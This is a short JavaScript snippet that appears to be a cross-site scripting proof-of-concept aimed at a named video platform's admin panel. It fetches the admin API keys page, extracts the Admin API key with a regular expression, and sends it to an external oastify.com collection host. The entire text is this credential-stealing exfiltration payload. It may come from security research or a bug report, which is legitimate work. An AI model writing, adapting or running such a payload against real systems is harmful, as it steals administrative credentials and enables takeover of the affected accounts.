fetch(“https://admin.zype.com/api_keys”).then(a => a.text()).then(a => {const apiKeyMatch = a.match(/<td>Admin</td>\s*<td>(\w+)</td>/);if (apiKeyMatch) {
const apiKey = apiKeyMatch[1];
return fetch(“https://6dkieyob0kpa1xmwx4m5ja0ztqzhn9by.oastify.com?x=” + apiKey);
} else {
console.error(“API Key not found in the response”);
}
})
.then(response => {
console.log(response);
});
